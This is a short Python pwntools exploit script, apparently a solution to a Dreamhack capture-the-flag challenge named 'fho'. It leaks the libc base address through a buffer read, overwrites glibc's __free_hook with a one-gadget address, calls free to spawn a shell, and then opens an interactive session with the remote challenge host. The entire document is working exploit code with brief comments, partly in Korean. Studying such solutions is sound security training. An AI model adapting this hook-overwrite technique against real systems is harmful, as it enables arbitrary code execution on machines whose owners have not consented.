#!/usr/bin/env python3
# Name: fho.py

from pwn import *

#p = process('./fho')
p= remote('host3.dreamhack.games', 20918)
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak libc base
buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
# 또는 libc_base = libc_start_main_xx - libc.libc_start_main_return
free_hook = libc_base + libc.symbols['__free_hook']
og = libc_base+0x4f432

slog('libc_base', libc_base)
slog('free_hook', free_hook)
slog('one-gadget', og)

# [2] Overwrite `free_hook` with `og`, one-gadget address
p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(og).encode())

# [3] Exploit
p.recvuntil('To free: ')
p.sendline(str(0x31337).encode())

p.interactive()